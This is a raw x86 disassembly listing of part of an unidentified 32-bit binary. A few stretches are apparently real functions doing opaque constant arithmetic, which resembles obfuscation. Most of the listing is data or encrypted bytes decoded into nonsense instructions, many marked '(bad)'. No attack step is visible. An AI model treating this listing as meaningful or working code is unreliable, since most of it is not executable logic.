  410ff5:	and    al,BYTE PTR [edi]
  410ff7:	arpl   WORD PTR [ecx+0x6e561f51],bx
  410ffd:	or     al,0xd8
  410fff:	xlat   BYTE PTR es:[ebx]
  411001:	xor    BYTE PTR [esi-0xf],dh
  411004:	pop    eax
  411005:	fs scas al,BYTE PTR es:[edi]
  411007:	add    ebx,DWORD PTR ds:0x3db32125
  41100d:	pop    ebx
  41100e:	in     eax,dx
  41100f:	iret   
  411010:	pop    edx
  411011:	js     0x411042
  411013:	or     esp,ebp
  411015:	push   esi
  411016:	inc    edx
  411017:	cmp    BYTE PTR [ebx],bh
  411019:	cmc    
  41101a:	(bad)  
  41101b:	lods   al,BYTE PTR ds:[esi]
  41101c:	and    al,bh
  41101e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  411020:	dec    DWORD PTR [esi-0x5d]
  411023:	jecxz  0x411003
  411025:	mov    ebp,0xca3966c0
  41102a:	jmp    0x411003
  41102c:	sahf   
  41102d:	jns    0x411012
  41102f:	pusha  
  411030:	in     al,0xcd
  411032:	pop    ecx
  411033:	mov    ecx,DWORD PTR [ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x6c]
  4111f1:	fidiv  DWORD PTR [ecx]
  4111f3:	mov    esi,0x18187cee
  4111f8:	jno    0x41120e
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	rcl    BYTE PTR [esi+0x70],1
  4111ff:	test   bh,0x42
  411202:	push   ss
  411203:	pusha  
  411204:	or     BYTE PTR [ecx-0x65],dh
  411207:	(bad)  
  411208:	enter  0x6197,0x29
  41120c:	adc    bh,al
  41120e:	mov    al,dl
  411210:	cmp    ebx,DWORD PTR [ecx-0x4fc524ca]
  411216:	jmp    0xa85ecc4
  41121b:	es push 0x71a3a52b
  411221:	and    cl,cl
  411223:	(bad)  
  411224:	lods   al,BYTE PTR ds:[esi]
  411225:	scas   eax,DWORD PTR es:[edi]
  411226:	std    
  411227:	sbb    DWORD PTR [edx+0x13f77178],ebx
  41122d:	pop    eax
  41122e:	jge    0x4111e0
  411230:	int    0xf
  411232:	mov    ds:0x15e34806,eax
  411237:	lods   eax,DWORD PTR ds:[esi]
  411238:	mov    ds:0xc85c2bd6,al
  41123d:	test   eax,0x2350c55c
  411242:	inc    eax
  411243:	ret    0x81b6
  411246:	mov    dl,0x5c
  411248:	into   
  411249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41124a:	xchg   edi,eax
  41124b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41124c:	jno    0x41125b
  41124e:	retf   0x459b
  411251:	cmp    eax,esi
  411253:	mov    al,cs:0x85d4d97b
  411259:	icebp  
  41125a:	jns    0x4112da
  41125c:	in     al,0xa3
  41125e:	sbb    al,0x7b
  411260:	dec    edx
  411261:	dec    ecx
  411262:	or     al,al
  411264:	sbb    ebp,ebx
  411266:	pop    ss
  411267:	push   ebp
  411268:	jmp    0x61b8:0xa0eade48
  41126f:	call   0xf27563c6
  411274:	mov    ebp,DWORD PTR [edx+0x69f31606]
  41127a:	scas   al,BYTE PTR es:[edi]
  41127b:	es jmp 0xae94:0x8219eb67
  411283:	xchg   DWORD PTR [esi],ebp
  411285:	inc    esi
  411286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411287:	push   eax
  411288:	xchg   bh,bl
  41128a:	cmp    al,0xa6
  41128c:	in     eax,dx
  41128d:	mov    ds:0x20753935,eax
  411292:	xor    DWORD PTR [esi-0x5349fd2b],eax
  411298:	xor    BYTE PTR [edi+0x64face89],0xe5
  41129f:	cdq    
  4112a0:	rdtsc  
  4112a2:	call   0x8414:0x8b9d534
  4112a9:	inc    esp
  4112aa:	push   ebp
  4112ab:	lock pop es
  4112ad:	jo     0x41129c
  4112af:	fsub   QWORD PTR [edx+0x252fac41]
  4112b5:	(bad)  
  4112b6:	jge    0x4112f0
  4112b8:	push   esp
  4112b9:	jmp    FWORD PTR [ebx+ecx*1]
  4112bc:	loopne 0x41124b
  4112be:	adc    bh,0x47
  4112c1:	push   esp
  4112c2:	mov    BYTE PTR [ecx-0x6897a72c],0x96
  4112c9:	or     BYTE PTR [ebp+0x58797266],0x4d
  4112d0:	cmp    bl,BYTE PTR [ebx+0x5b]
  4112d3:	sbb    eax,0x3ae74cd8
  4112d8:	fdiv   QWORD PTR [edx+0xfb010ab]
  4112de:	xchg   ecx,eax
  4112df:	add    dl,BYTE PTR [ecx+0x4be2594e]
  4112e5:	add    al,0xdc
  4112e7:	dec    esp
  4112e8:	outs   dx,DWORD PTR ds:[esi]
  4112e9:	dec    esp
  4112ea:	mov    esp,cs
  4112ec:	and    ch,ch
  4112ee:	push   es
  4112ef:	ss out 0x8b,eax
  4112f2:	test   eax,ebx
  4112f4:	das    
  4112f5:	cwde   
  4112f6:	mov    al,0x55
  4112f8:	sbb    BYTE PTR [edi],al
  4112fa:	jne    0x41136f
  4112fc:	sbb    eax,0xdfef2691
  411301:	lods   eax,DWORD PTR ds:[esi]
  411302:	dec    ebx
  411303:	out    0x8d,al
  411305:	stc    
  411306:	cld    
  411307:	mov    ah,0xf2
  411309:	fnsave [ebp-0x138fa087]
  41130f:	rol    ch,cl
  411311:	repz or eax,0x55156f33
  411317:	dec    ebp
  411318:	(bad)  
  411319:	adc    bl,BYTE PTR [ebp-0x16efd42d]
  41131f:	mov    ds:0xe6e4f2a4,al
  411324:	push   DWORD PTR [esi-0x14fc495f]
  41132a:	call   FWORD PTR [edx]
  41132c:	xchg   edx,eax
  41132d:	in     eax,dx
  41132e:	push   cs
  41132f:	mov    BYTE PTR [edx],0x18
  411332:	or     DWORD PTR [ecx+0x7db8a3a3],ecx
  411338:	fistp  QWORD PTR [edi+0x4]
  41133b:	loop   0x411392
  41133d:	and    ah,BYTE PTR [esi]
  41133f:	out    dx,al
  411340:	loope  0x4112f6
  411342:	imul   ecx,DWORD PTR [ecx-0x7483ed03],0x2626c868
  41134c:	outs   dx,DWORD PTR ds:[esi]
  41134d:	popf   
  41134e:	ja     0x41138b
  411350:	mov    edx,0xa346ddd5
  411355:	aam    0xe0
  411357:	fsub   QWORD PTR ds:0xefff71cc
  41135d:	or     DWORD PTR ds:0xd1205628,esp
  411363:	push   0xfffffff8
  411365:	push   ds
  411366:	pop    esp
  411367:	clc    
  411368:	xchg   ecx,eax
  411369:	cmp    DWORD PTR [ecx+ebx*1-0x38fb541e],eax
  411370:	mov    ds:0x7c302a2,eax
  411375:	je     0x411346
  411377:	cmp    al,0xb1
  411379:	xchg   edi,eax
  41137a:	cli    
  41137b:	int3   
  41137c:	popa   
  41137d:	cmc    
  41137e:	mov    bl,0x1
  411380:	jmp    0x8180:0x1f18de36
  411387:	test   BYTE PTR [esi-0x48],ah
  41138a:	pop    ss
  41138b:	adc    DWORD PTR ds:0x37cd7394,esi
  411391:	cmp    BYTE PTR [edx+0x54],al
  411394:	and    ecx,DWORD PTR [ebx]
  411396:	les    ebp,FWORD PTR [ebp-0x6d]
  411399:	cmp    BYTE PTR [ebp+0x12],al
  41139c:	mov    ds,WORD PTR [esi-0x21fcfb8e]
  4113a2:	retf   0xdb14
  4113a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a6:	and    ebx,DWORD PTR [edx+ecx*1]
  4113a9:	nop
  4113aa:	mov    ds:0x5bdca7ce,al
  4113af:	cmp    dh,BYTE PTR [eax+edx*1+0x2f1d4455]
  4113b6:	fistp  WORD PTR [ecx+esi*1-0x2a]
  4113ba:	les    ecx,FWORD PTR [edi+0x3d]
  4113bd:	xchg   ebx,eax
  4113be:	xchg   esi,eax
  4113bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113c0:	out    dx,eax
  4113c1:	xchg   bl,cl
  4113c3:	test   al,0x17
  4113c5:	push   esi
  4113c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c7:	mov    dh,0x66
  4113c9:	and    eax,0x140d9149
  4113ce:	mov    eax,ds:0xb2f2d9de
  4113d3:	or     DWORD PTR [ebx],ecx
  4113d5:	outs   dx,BYTE PTR ds:[esi]
  4113d6:	push   esp
  4113d7:	fsubp  st(4),st
  4113d9:	aam    0xb1
  4113db:	int3   
  4113dc:	adc    eax,0x88b41fcb
  4113e1:	dec    ebx
  4113e2:	push   edi
  4113e3:	(bad)  
  4113e4:	or     eax,0x596b4f29
  4113e9:	fstp   DWORD PTR [esi+0x34]
  4113ec:	push   ebx
  4113ed:	xor    ch,BYTE PTR ds:0x3180ac33
  4113f3:	jns    0x411409
  4113f5:	leave  
  4113f6:	imul   edi,DWORD PTR [esp+ebp*4],0x63f821d0
  4113fd:	idiv   BYTE PTR [ebx+0x66]
  411400:	inc    ebx
  411401:	dec    edi
  411402:	call   0xc153:0xc40c35c5
  411409:	sub    dh,BYTE PTR [eax]
  41140b:	dec    eax
  41140c:	and    edx,DWORD PTR [edx+0x38596d05]
  411412:	jno    0x411429
  411414:	out    dx,al
  411415:	inc    eax
  411416:	stos   BYTE PTR es:[edi],al
  411417:	in     eax,0xb6
  411419:	lea    ecx,[edi+ebp*4+0x3ab00617]
  411420:	iret   
  411421:	leave  
  411422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411423:	rol    bh,cl
  411425:	xchg   ebx,eax
  411426:	push   ecx
  411427:	cmp    eax,0x9377ba45
  41142c:	sbb    dh,bl
  41142e:	std    
  41142f:	pop    ebp
  411430:	dec    ebx
  411431:	mov    eax,ds:0xcf6b39e6
  411436:	or     al,0xcb
  411438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411439:	adc    al,0xbf
  41143b:	(bad)  
  41143c:	and    BYTE PTR [ebp+0x1e7f39d3],al
  411442:	mov    edx,0x48ff9466
  411447:	in     al,dx
  411448:	fcomip st,st(2)
  41144a:	ins    DWORD PTR es:[edi],dx
  41144b:	cld    
  41144c:	jbe    0x411462
  41144e:	les    esp,FWORD PTR [edx+ebx*4-0x3f]
  411452:	iret   
  411453:	sub    eax,0xff5085c7
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x7a7e2188]
  4114b5:	inc    edx
  4114b6:	daa    
  4114b7:	stos   BYTE PTR es:[edi],al
  4114b8:	inc    edi
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	stc    
  4114c1:	mov    bh,0x56
  4114c3:	daa    
  4114c4:	push   ss
  4114c5:	push   eax
  4114c6:	adc    eax,0x1a52a6b6
  4114cb:	je     0x411469
  4114cd:	cli    
  4114ce:	(bad)  
  4114cf:	arpl   WORD PTR [edi-0x29f53666],dx
  4114d5:	dec    edi
  4114d6:	test   DWORD PTR ds:0x8a0b94bc,ecx
  4114dc:	sbb    BYTE PTR [ebx],dl
  4114de:	cwde   
  4114df:	jb     0x4114d8
  4114e1:	rcr    dl,cl
  4114e3:	dec    esp
  4114e4:	ret    
  4114e5:	cli    
  4114e6:	or     al,0xad
  4114e8:	ror    DWORD PTR [ecx],0x15
  4114eb:	inc    ebp
  4114ec:	jno    0x411553
  4114ee:	or     eax,0xc7e71856
  4114f3:	ret    
  4114f4:	std    
  4114f5:	jo     0x4114de
  4114f7:	mov    ebx,0x9e51f1fb
  4114fc:	repnz lds edx,FWORD PTR [ebx+0x6a1833aa]
  411503:	xor    bh,al
  411505:	and    DWORD PTR [edi],edx
  411507:	ins    DWORD PTR es:[edi],dx
  411508:	arpl   WORD PTR [ecx],bp
  41150a:	mov    ecx,0x718a621c
  41150f:	(bad)  
  411510:	cmp    edx,ebp
  411512:	sub    dh,BYTE PTR [ecx]
  411514:	add    edx,ebx
  411516:	push   eax
  411517:	push   ebp
  411518:	shr    ecx,1
  41151a:	cwde   
  41151b:	cwde   
  41151c:	fs out dx,al
  41151e:	sbb    BYTE PTR [edx+0x75],ah
  411521:	or     al,0x66
  411523:	inc    ebp
  411524:	into   
  411525:	cmp    eax,0xb32a8ddd
  41152a:	push   esp
  41152b:	and    BYTE PTR ds:[ecx],cl
  41152e:	aam    0x1c
  411530:	add    edi,DWORD PTR [esi+0x6]
  411533:	add    eax,0xffdc7a3e
  411538:	push   edi
  411539:	cmc    
  41153a:	cwde   
  41153b:	dec    esi
  41153c:	call   0x25aa5cf3
  411541:	loop   0x41153a
  411543:	add    cl,BYTE PTR ds:[esi]
  411546:	jo     0x411538
  411548:	inc    esi
  411549:	and    dl,BYTE PTR [edi-0x65ea33c4]
  41154f:	cli    
  411550:	ret    
  411551:	xlat   BYTE PTR ds:[ebx]
  411552:	stos   BYTE PTR es:[edi],al
  411553:	call   0x3f4c:0xe9ec7351
  41155a:	rcl    esp,1
  41155c:	ss adc eax,0x1c99a6be
  411562:	sub    eax,0x5d6228a8
  411567:	sub    al,0x61
  411569:	rol    BYTE PTR [edi-0x63],1
  41156c:	imul   esi,DWORD PTR [ebx],0xfffffff8
  41156f:	jmp    0xcde7acc9
  411574:	or     DWORD PTR [ebp-0x21005dd4],0xcb484ad9
  41157e:	out    dx,al
  41157f:	(bad)  
  411580:	fld    DWORD PTR [edx-0x6deead89]
  411586:	add    DWORD PTR [ebx+0x7f],ebp
  411589:	cmp    ebp,DWORD PTR [ebp-0x12]
  41158c:	or     edi,eax
  41158e:	adc    BYTE PTR [esi+0x1a],bh
  411591:	icebp  
  411592:	bnd jl 0x41153a
  411595:	mov    edx,0x72f47ea2
  41159b:	stc    
  41159c:	int    0xc1
  41159e:	jbe    0x4115f0
  4115a0:	js     0x411559
  4115a2:	mov    ebx,0x45cfaaaf
  4115a7:	aaa    
  4115a8:	mov    esi,DWORD PTR [ecx]
  4115aa:	adc    DWORD PTR [edi],edi
  4115ac:	imul   BYTE PTR [edi+ecx*2-0x1bdc3464]
  4115b3:	pop    ecx
  4115b4:	out    0xa3,eax
  4115b6:	leave  
  4115b7:	cmp    ch,al
  4115b9:	pop    ebx
  4115ba:	push   cs
  4115bb:	pop    ss
  4115bc:	fptan  
  4115be:	idiv   eax
  4115c0:	cmp    eax,0xed9479a9
  4115c5:	adc    DWORD PTR [ebp+0x743d4f1],esi
  4115cb:	jecxz  0x411555
  4115cd:	imul   ebp,DWORD PTR [ebp-0x423b812e],0xffffffd5
  4115d4:	iret   
  4115d5:	jns    0x411586
  4115d7:	or     esi,DWORD PTR [edi+0x28]
  4115da:	add    ah,ch
  4115dc:	mov    ds,WORD PTR [ecx+0x4d350f8e]
  4115e2:	mov    eax,ds:0xf4395aac
  4115e7:	jne    0x4115bc
  4115e9:	cmp    ebx,0x4c
  4115ec:	xor    al,0xe0
  4115ee:	mov    bh,0xa9
  4115f0:	rcl    DWORD PTR [edi],1
  4115f2:	pop    esi
  4115f3:	test   BYTE PTR [esi+0x31],dh
  4115f6:	pop    DWORD PTR [esi+0x760772b4]
  4115fc:	jo     0x4115f0
  4115fe:	cmp    ecx,DWORD PTR [eax*1+0x297c673e]
  411605:	pusha  
  411606:	push   edx
  411607:	pop    esp
  411608:	loop   0x4115cc
  41160a:	call   FWORD PTR [esi]
  41160c:	mov    ch,dl
  41160e:	mov    ebp,0x5d0e25e9
  411613:	das    
  411614:	ret    
  411615:	(bad)  
  411617:	pop    ebp
  411618:	sbb    BYTE PTR gs:[edi+0x756720c4],bl
  41161f:	cmp    ecx,DWORD PTR [esi-0x2f]
  411622:	inc    ebx
  411623:	enter  0x3ee8,0x84
  411627:	mov    ebx,0x55b83f55
  41162c:	in     al,dx
  41162d:	push   esp
  41162e:	lahf   
  41162f:	add    dl,bh
  411631:	pop    edx
  411632:	std    
  411633:	jp     0x411648
  411635:	in     eax,0xe4
  411637:	xchg   esp,eax
  411638:	mov    cl,0xa
  41163a:	ins    DWORD PTR es:[edi],dx
  41163b:	or     eax,0x9f898537
  411640:	fnstcw WORD PTR [ecx-0x67007736]
  411646:	push   ss
  411647:	neg    BYTE PTR [ebx]
  411649:	rol    BYTE PTR [edi-0x23da5eb6],1
  41164f:	xchg   esp,eax
  411650:	lds    esi,FWORD PTR [edx]
  411652:	prefetch BYTE PTR [ebp+0x44]
  411656:	xor    al,0x55
  411658:	mov    ds:0x1792d792,eax
  41165d:	arpl   WORD PTR [ebx],di
  41165f:	dec    esi
  411660:	imul   ebp,DWORD PTR [esi-0x551a747e],0xca358baa
  41166a:	push   ds
  41166b:	sub    DWORD PTR [edx+0x7c56825a],ebx
  411671:	inc    esp
  411672:	into   
  411673:	jl     0x411640
  411675:	inc    esi
  411676:	aad    0x46
  411678:	stos   BYTE PTR es:[edi],al
  411679:	jecxz  0x4116f5
  41167b:	lea    edx,[edx-0x59]
  41167e:	mov    DWORD PTR ds:0xbad450,eax
  411684:	imul   esp,DWORD PTR [edi+0x71],0x54b09731
  41168b:	push   cs
  41168c:	(bad)  
  41168d:	shr    DWORD PTR [edx-0x7c8f77bb],cl
  411693:	mov    WORD PTR [eax+0x7b],fs
  411696:	adc    eax,0x522f6f40
  41169b:	and    DWORD PTR [edi+ebp*8-0x8],esp
  41169f:	jmp    0x4116de
  4116a1:	adc    edx,edx
  4116a3:	cwde   
  4116a4:	lds    ecx,FWORD PTR [edx+ebx*4]
  4116a7:	outs   dx,DWORD PTR ds:[esi]
  4116a8:	xor    esp,DWORD PTR [eax]
  4116aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ab:	jb     0x411681
  4116ad:	ret    0x8aca
  4116b0:	stc    
  4116b1:	sbb    BYTE PTR [edi],bl
  4116b3:	into   
  4116b4:	ds call 0x5348:0x193d3ab5
  4116bc:	stos   DWORD PTR es:[edi],eax
  4116bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116be:	shl    esp,1
  4116c0:	jge    0x4116ac
  4116c2:	lods   al,BYTE PTR ds:[esi]
  4116c3:	mov    WORD PTR [ebp+0x7bb3d73e],cs
  4116c9:	jbe    0x41164d
  4116cb:	add    ecx,esi
  4116cd:	lods   al,BYTE PTR ds:[esi]
  4116ce:	dec    ecx
  4116cf:	mov    esp,DWORD PTR [edx+ecx*1-0x78]
  4116d3:	sub    esp,eax
  4116d5:	in     al,dx
  4116d6:	fwait
  4116d7:	mov    esp,0x42545524
  4116dc:	rol    BYTE PTR [ebx],0x76
  4116df:	imul   eax,DWORD PTR [eax+0x133862b],0x36a3c0
  4116e9:	shl    ah,cl
  4116eb:	inc    edi
  4116ec:	rol    BYTE PTR [edx-0x7914575b],1
  4116f2:	mov    dl,BYTE PTR [bx+si]
  4116f5:	mov    al,dl
  4116f7:	sub    DWORD PTR [ecx-0x6ca53752],ebx
  4116fd:	dec    esp
  4116fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ff:	sar    bl,cl
  411701:	sti    
  411702:	cmp    al,BYTE PTR [esi]
  411704:	xchg   edx,eax
  411705:	cmp    DWORD PTR [edi-0x68],ebp
  411708:	aad    0x6b
  41170a:	out    0x4e,eax
  41170c:	scas   al,BYTE PTR es:[di]
  41170e:	stc    
  41170f:	pop    eax
  411710:	out    0x7d,eax
  411712:	lods   eax,DWORD PTR ds:[esi]
  411713:	pusha  
  411714:	lahf   
  411715:	pop    ds
  411716:	xchg   ebx,eax
  411717:	rol    bh,0x45
  41171a:	cld    
  41171b:	hlt    
  41171c:	xor    BYTE PTR [eax],al
  41171e:	add    BYTE PTR [ebx+0x4d8be045],cl
  411724:	in     al,0x68
  411726:	adc    BYTE PTR [ebx+0x0],0x0
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xacb5aa57
  411755:	fnstcw WORD PTR [esi+ebx*4+0x71181874]
  41175c:	adc    al,0x18
  41175e:	sbb    BYTE PTR [ecx-0x73],dl
  411761:	adc    ecx,esp
  411763:	jg     0x4117af
  411765:	push   ecx
  411766:	clc    
  411767:	test   ecx,edi
  411769:	lds    ecx,FWORD PTR [esp+esi*2+0x49]
  41176d:	xchg   edi,eax
  41176e:	out    dx,eax
  41176f:	outs   dx,BYTE PTR ds:[esi]
  411770:	sub    al,0xd7
  411772:	ret    
  411773:	and    bh,BYTE PTR [eax]
  411775:	inc    ecx
  411776:	mov    ebx,0xde4fa06e
  41177b:	and    al,0x55
  41177d:	or     esp,DWORD PTR [esi]
  41177f:	pushf  
  411780:	fidiv  WORD PTR [ebp+ebp*2-0x3c]
  411784:	mov    dh,0x44
  411786:	xor    ah,BYTE PTR [eax+esi*8+0x5b8f3e96]
  41178d:	ins    DWORD PTR es:[edi],dx
  41178e:	mov    eax,ds:0x33bfb6d4
  411793:	cmp    BYTE PTR [edx-0x4af99af3],0xed
  41179a:	or     ah,ah
  41179c:	ins    DWORD PTR es:[edi],dx
  41179d:	pop    es
  41179e:	aas    
  41179f:	retf   0xf363
  4117a2:	lds    edi,FWORD PTR [ebp+0x6f]
  4117a5:	mov    ebp,0x2c7b047a
  4117aa:	xchg   ebp,eax
  4117ab:	and    ecx,DWORD PTR [edi+0x22cebab7]
  4117b1:	push   ebx
  4117b2:	ins    BYTE PTR es:[edi],dx
  4117b3:	jo     0x411767
  4117b5:	adc    eax,0xa6b1af98
  4117ba:	das    
  4117bb:	(bad)  
  4117bc:	and    BYTE PTR [esi-0x14],bh
  4117bf:	jmp    0x411785
  4117c1:	lods   eax,DWORD PTR ds:[esi]
  4117c2:	add    BYTE PTR [ecx],bh
  4117c4:	int3   
  4117c5:	xchg   esp,eax
  4117c6:	pop    edx
  4117c7:	jns    0x411806
  4117c9:	stos   DWORD PTR es:[edi],eax
  4117ca:	pusha  
  4117cb:	xchg   DWORD PTR [edi+0x81180f8],edx
  4117d1:	dec    edx
  4117d2:	pop    edx
  4117d3:	cs inc eax
  4117d5:	data16 (bad) [eax]
  4117d8:	not    DWORD PTR [ebx+0x4b9e1306]
  4117de:	dec    ebp
  4117df:	pop    ecx
  4117e0:	add    DWORD PTR cs:[edx],edi
  4117e3:	pop    edi
  4117e4:	(bad)  
  4117e5:	popa   
  4117e6:	div    DWORD PTR [ebx+0x53d9c21a]
  4117ec:	xchg   ecx,eax
  4117ed:	or     cl,dh
  4117ef:	jl     0x411793
  4117f1:	mov    ebx,0xf4130682
  4117f6:	cmc    
  4117f7:	xor    eax,DWORD PTR [edx-0x39b1a8f6]
  4117fd:	add    al,0x8e
  4117ff:	sbb    DWORD PTR [edi-0x7e4e18df],eax
  411805:	cmp    eax,0xbce53e4a
  41180a:	xchg   ebx,eax
  41180b:	ins    DWORD PTR es:[edi],dx
  41180c:	adc    esp,DWORD PTR [esp+ebx*2-0x10]
  411810:	xchg   ebp,eax
  411811:	sbb    al,0xeb
  411813:	sbb    ecx,DWORD PTR [ebp-0x528cf4cd]
  411819:	mov    dh,0x7b
  41181b:	jne    0x4117a2
  41181d:	mov    ebp,0x251fc5e6
  411822:	loopne 0x41189e
  411824:	out    dx,eax
  411825:	xor    DWORD PTR [ebx+0x65562ee2],edi
  41182b:	jo     0x4117fd
  41182d:	adc    edx,DWORD PTR [ebx+esi*4-0x3]
  411831:	mov    edx,0x4d7940a2
  411836:	dec    esp
  411837:	ret    0x2835
  41183a:	iret   
  41183b:	je     0x41184d
  41183d:	mov    bl,0x74
  41183f:	inc    ebx
  411840:	mov    ds:0x37406f4c,eax
  411845:	push   esp
  411846:	out    0x95,eax
  411848:	lods   al,BYTE PTR ds:[esi]
  411849:	sbb    DWORD PTR [esi+0x36fb374b],edx
  41184f:	emms   
  411851:	xor    eax,0x7a5bed5c
  411856:	sbb    esi,DWORD PTR [eax]
  411858:	fst    QWORD PTR [edi+0x4c866036]
  41185e:	mov    al,ds:0xbc6b39e9
  411863:	fimul  WORD PTR [ecx+0x4c5e05ae]
